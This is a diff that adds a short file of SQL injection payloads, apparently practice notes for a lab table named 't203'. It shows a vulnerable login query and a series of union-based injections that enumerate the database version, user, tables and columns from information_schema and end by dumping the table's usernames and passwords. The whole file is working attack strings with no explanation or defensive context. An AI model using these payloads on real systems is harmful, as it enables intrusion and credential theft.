@@ -1,0 +1,10 @@
+select user,pass from t203 where user='d'union SELECT table_name, table_type, engine FROM information_schema.tables#' and pass='d'
+
+d'union select version(),user() FROM information_schema.tables#
+d'union SELECT database(),user() FROM information_schema.tables#
+d'union SELECT database(),table_name FROM information_schema.tables where table_schema=database()#
+d'union select column_name,database() from information_schema.columns where table_name="t203"#
+'union select user,pass from t203 #
+
+
+
